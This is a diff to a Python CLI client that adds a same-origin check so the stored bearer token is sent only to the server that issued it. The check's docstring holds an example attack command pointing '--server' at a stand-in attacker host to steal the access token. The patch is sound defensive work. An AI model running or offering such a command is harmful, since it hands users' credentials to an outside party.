@@ -19,10 +19,23 @@ import httpx
 from upscaler_cli import __version__
 from upscaler_cli.auth.token_store import TokenStore
 from upscaler_cli.errors import APIError, AuthRequiredError
+from upscaler_cli.security import same_origin, validate_request_path
 
 logger = logging.getLogger(__name__)
 
 USER_AGENT = f"UpscalerCLI/{__version__}"
+
+
+def _origin_label(url: str) -> str:
+    """Render a URL's origin for an error message, without its path or query."""
+    from upscaler_cli.security import origin_of
+
+    origin = origin_of(url)
+    if origin is None:
+        return url or "(unset)"
+    scheme, host, port = origin
+    default = {"http": 80, "https": 443}.get(scheme)
+    return f"{scheme}://{host}" if port == default else f"{scheme}://{host}:{port}"
 
 
 class UpscalerClient:
@@ -71,6 +84,7 @@ class UpscalerClient:
             AuthRequiredError: If not authenticated or refresh fails.
             APIError: If the API returns a non-success response.
         """
+        validate_request_path(path)
         url = f"{self.server_url}{path}"
         request_id = str(uuid.uuid4())
 
@@ -79,6 +93,8 @@ class UpscalerClient:
             token_data = self.token_store.load()
         except RuntimeError as e:
             raise AuthRequiredError(str(e))
+
+        self._assert_token_origin(token_data)
 
         # First attempt
         response = await self._send(method, url, token_data.access_token, request_id, **kwargs)
@@ -119,6 +135,34 @@ class UpscalerClient:
             raise APIError(error_msg, response.status_code)
 
         return result
+
+    def _assert_token_origin(self, token_data) -> None:
+        """Refuse to send the stored bearer token to a server that did not issue it.
+
+        `server_url` is resolved from --server, $UPSCALER_SERVER, or config —
+        all of which an attacker may control without touching the token store
+        (a crafted command in a README, an agent skill, or a poisoned shell
+        env). Without this check, `upscaler --server http://attacker.example
+        list todos` hands the production access token straight to the
+        attacker, over plaintext HTTP if they ask for it.
+
+        The issuing server is recorded on the token as `token_endpoint` at
+        login. When it is absent (a token written by an older version) the
+        origin cannot be established, and the check is skipped rather than
+        locking the user out of a working session; anyone able to rewrite that
+        field can already read the token.
+        """
+        issuer = getattr(token_data, "token_endpoint", "") or ""
+        if not issuer:
+            return
+        if same_origin(self.server_url, issuer):
+            return
+        raise AuthRequiredError(
+            f"Refusing to send credentials for {_origin_label(issuer)} to "
+            f"{_origin_label(self.server_url)}. The stored token was issued by a "
+            "different server. Use a separate profile for this server "
+            "(upscaler --profile <name> login), or run: upscaler login"
+        )
 
     async def _send(
         self,
